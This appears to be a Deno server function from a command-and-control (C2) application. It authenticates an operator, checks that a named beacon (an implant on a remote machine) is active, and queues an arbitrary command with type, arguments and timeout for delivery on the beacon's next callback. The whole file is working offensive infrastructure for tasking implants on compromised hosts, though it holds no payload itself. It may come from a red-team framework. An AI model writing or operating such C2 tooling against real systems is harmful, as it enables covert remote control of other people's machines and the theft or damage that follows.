import { createClientFromRequest } from 'npm:@base44/sdk@0.8.6';

Deno.serve(async (req) => {
  try {
    const api = createClientFromRequest(req);
    const user = await api.auth.me();

    if (!user) {
      return Response.json({ error: 'Unauthorized' }, { status: 401 });
    }

    let body;
    try {
      body = await req.json();
    } catch {
      return Response.json({ error: 'Invalid JSON body' }, { status: 400 });
    }
    body = body || {};
    const { beacon_id, command_type, command, c2_server_id, timeout = 300 } = body;

    if (!beacon_id || !command_type || !command) {
      return Response.json({
        error: 'Missing required parameters: beacon_id, command_type, command'
      }, { status: 400 });
    }

    // Verify beacon exists and is active
    const beacons = await api.entities.Beacon.filter({ beacon_id });
    if (!beacons || beacons.length === 0) {
      return Response.json({ error: 'Beacon not found' }, { status: 404 });
    }

    const beacon = beacons[0];
    if (beacon.status !== 'active') {
      return Response.json({
        error: `Beacon status is ${beacon.status}, not active`
      }, { status: 409 });
    }

    // Create command
    const newCommand = await api.entities.Command.create({
      beacon_id: beacon_id,
      c2_server_id: c2_server_id || beacon.c2_server_id,
      command_type: command_type,
      command: command,
      arguments: body.arguments || {},
      status: 'queued',
      issued_by: user.email,
      issued_at: new Date().toISOString(),
      timeout: timeout
    });

    return Response.json({
      status: 'queued',
      command_id: newCommand.id,
      beacon_id: beacon_id,
      message: 'Command queued. Will be delivered on next beacon callback.'
    });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});